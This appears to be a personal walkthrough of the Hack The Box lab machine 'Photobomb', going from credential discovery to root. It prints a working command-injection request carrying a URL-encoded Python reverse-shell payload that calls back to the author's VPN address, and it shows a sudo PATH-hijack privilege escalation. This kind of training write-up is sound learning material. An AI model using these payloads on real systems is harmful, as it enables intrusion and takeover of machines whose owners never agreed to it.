*Photobomb* is an Easy Level system on Hack The Box. A JavaScript function can be found when inspecting the webpage associated with the challenge, the script was created to pre-populate credentials for tech support. The link to this script contains plaintext credentials which can be used to log into a subdomain on the webserver.
From this web page I am able to process a *POST* request that passes three *parameters* to the webserver using the "DOWNLOAD PHOTO TO PRINT" button. One of these parameters is vulnerable to *Blind Command Injection*, which I'm able to take advantage of and pass the webserver a *URL-encoded reverse shell payload* that I catch with a listener on my system.
Finally with a foothold I'm able to check the *users sudo privileges* and see they are able to execute a script with *sudo* permissions and for this one script this user can also set environment variables.
Since I am able to set a custom *PATH* variable when executing the script using *sudo* I can reference a "find" command created by me to give myself a shell with root privileges that the script will execute at the end of its run when it tries to reference the real *find* command without an *absolute path*.

<ins> **Enumeration** </ins>

I started this machine out with an *nmap service scan* that outputs the contents to a file.

`sudo nmap -sV -sC -oA <filename> <target_ip>`

![nmap output](/docs/assets/images/HTB/photobomb/pbomb01.png)

I can see that port *22/tcp* is open to *ssh* traffic using *OpenSSH 8.2p1* and port *80/tcp* is open to *http* traffic using *nginx 1.18.0* I can also see the machine is likely running some version of *Ubuntu Linux*.

Running *searchsploit* on both versions returned nothing.

![searchsploit output](/docs/assets/images/HTB/photobomb/pbomb02.png)

Navigating over to the webserver I get a server not found error so I have to add the *<target_IP>* and the *hostname* into the */etc/hosts* file. 

![notfound](/docs/assets/images/HTB/photobomb/pbomb03.png)

![/etc/hosts](/docs/assets/images/HTB/photobomb/pbomb04.png)

Now I'm greeted with a homepage when I refresh the webserver. Not much on this page except a description of the franchise and a link labeled *click here!*. Hovering my cursor it I'm able to see that it leads to the *photobomb.htb/printer* subdomain.

![homepage](/docs/assets/images/HTB/photobomb/pbomb05.png)

![click here!](/docs/assets/images/HTB/photobomb/pbomb06.png)

Clicking the *click here!* link prompts a login alert but I wasn't able to manually guess the credentials using a short list of defaults.

![login](/docs/assets/images/HTB/photobomb/pbomb07.png)

Inspecting the network traffic I'm able to see that there is a file in the *GET* request and can even see a link to it in the *header*. 

![Homepage Inspect](/docs/assets/images/HTB/photobomb/pbomb08.png)

The link to the script states its purpose in plain text. 

> pre-populate creds for tech support as they keep forgetting them and emailing me.

The other thing it shows it plaintext is what looks like the login credentials themselves in the *username:password* format.

![JS Function](/docs/assets/images/HTB/photobomb/pbomb09.png)

Using *PH0t0:b0Mb!* as credentials for the previous login alert grants me access to the */printer* subdomain.

<ins> **Gaining A Foothold** </ins>

On this page Iâ€™m able to select one of twelve images, along with a file type and resolution then download it by clicking the red "download photo to print" button at the bottom of the page. Using the download button while in inspect mode showed me that it was processed in the form of a POST request.
I took this to mean that when I try to download the image the server sends me back something based on data I sent it in the POST request.

![Post request](/docs/assets/images/HTB/photobomb/pbomb11.png)

To make this request easier to look at and potentially modify I load the webserver and set one up with *burpsuite* and intercepted it.

![Burp 1](/docs/assets/images/HTB/photobomb/pbomb12.png)

![Burp 2](/docs/assets/images/HTB/photobomb/pbomb13.png)

I can see on line sixteen three parameters are being passed to the webserver *photo*, *filetype*, and *dimensions*. By setting up a listener I'm able to test these parameters for *command injection vulnerabilities*
It took a lot of research online but eventually I found that can test this by using *BurpSuite's repeater* function to attempt to send myself a `ping`. I will also need to setup `tcpdump` to catch the ping.

`ping -c 3 <host_ip>`

To inject the ping into the parameter I separate it from the value with a *;* and test it one at a time. It looks something like this.

`photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg;ping+-c+3+10.10.14.29&filetype=jpg&dimensions=3000x2000`

Using `tcpdump` in a separate terminal to capture and display the ping requests I enter the following command where `-n` prevents conversion of IP addresses and hostnames, `-i tun0` specifies the vpn I'm connected to as the network interface to listen on, and `icmp` specifies to cpature only *ICMP packets*.

`sudo tcpdump -ni tun0 icmp`

After a little trial and error I finally get it to work with the *filetype* parameter. This tells me that there is indeed a *command injection vulnerability* with this *POST* request.

![Repeater](/docs/assets/images/HTB/photobomb/pbombedit1.png)

![working ping](/docs/assets/images/HTB/photobomb/pbombedit2.png)

/* For some reason these screenshots got lost during my documentation process and the ip_address of my connection to the vpn changed when I went back to retake them.

After some more trial and error I was finally able to find a *URL encoded* *Python* script that works. It sends a reverse shell to a listener I set up in a new terminal window.

`%3bexport+RHOST%3d"10.10.14.19"%3bexport+RPORT%3d3232%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'`

Put together properly the payload looks like this:

```
photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg%3bexport+RHOST%3d"10.10.14.19"%3bexport+RPORT%3d3232%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'&dimensions=3000x2000 
```

![Payload](/docs/assets/images/HTB/photobomb/pbomb14.png)

![Listener](/docs/assets/images/HTB/photobomb/pbomb15.png)

Once I recieved the shell in my listener I used pyton to give msyelf an upgraded TTY and ran `whoami` to see that I am now logged in as the user *wizard*. The *user flag* was found in a text document in the *~/wizard/* directory

`python3 =c 'import pty; pty.spawn("/bin/bash")'`

![upgrade TTY](/docs/assets/images/HTB/photobomb/pbomb16.png)

![User Flag](/docs/assets/images/HTB/photobomb/pbomb17.png)

---


<ins> **Privilege Escalation** </ins>

Running `sudo -l` I am able to see a list of commands *wizard* can run with *root* permissions. It turns out they are able to execute what looks to be a bash script `/opt/cleanup.sh` also of note are the `SETENV:` and `NOPASSWD:` flags.
The `NOPASSWD` flag is pretty self explanatory but it means that this script can be executed as *root* through `sudo` without the need of a password. The `SETENV` flag allows environment variables to be set for this one command.

![Sudo -l](/docs/assets/images/HTB/photobomb/pbomb18.png)


I used `cat` to check out what the script actually does:

![cat /opt/cleanup.sh](/docs/assets/images/HTB/photobomb/pbomb19.png)

`#!/bin/bash` specifies this should be executed as a *bash* script, `. /opt/.bashrc` allows the script to use the environment variables and functions defined in the *.bashrc* file, `cd /home/wizard/photobomb` changes that directory.

The following section checks if the *log/photobomb.log* file exists and that it's a regular file, not a symbolic link. If it does exist it's contents are redirected to a new file called *photobomb.log.old*. It then uses the `truncate` command to resize the original file to zero bytes, which basically just means it cleared the files contents. 

```
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
    /bin/cat log/photobomb.log > log/photobomb.log.old
   /usr/bin/truncate -s0 log/photobomb.log
fi
```

This final line uses the `find` command to search for files with the *.jpg* extension in the *source_images* directory. If a file is found the `chown` command is used to change ownership of the file to the *root* user and group.

`find source_images -type f -name '*.jpg" -exec chown root:root {} \;`

With `SETENV` specified in the `sudo -l` command I can set a custom `PATH` variable that references a `find` command created by me when the script trys to run `find` without an absolute path in it's last line.

The following command creates a file called *find* in the */tmp* directory but instead of functioning like *find* it will instead generate me a shell with root privileges.

`echo "/bin/bash" > /tmp/find`

Now I can run `cleanup.sh` using a `PATH` variable set to point to the */tmp* directory, meaning that directory will be checked before all others referenced in the variable.
When `find` is ran without an absolute path the one I created located at `/tmp/find` will be ran with root privileges giving me a shell with root access.

`sudo PATH=/tmp:$PATH /opt/cleanup.sh`

![edit path](/docs/assets/images/HTB/photobomb/pbomb20edit.png)

From there the root shell is generated then I just needed to navigate over to the *root* directory and `cat` the file with the flag.

<ins> **Final Thoughts** </ins>

Photobomb was a really fun machine. I enjoyed learning different methods to test *POST* request parameters for command injection vulnerabilities even if most of them didn't work. I learned about the `SETENV` flag in a sudoers file and that I have a whole lot left to learn about how `PATH` works in general.
All and all I think this was a great *easy* level machine.
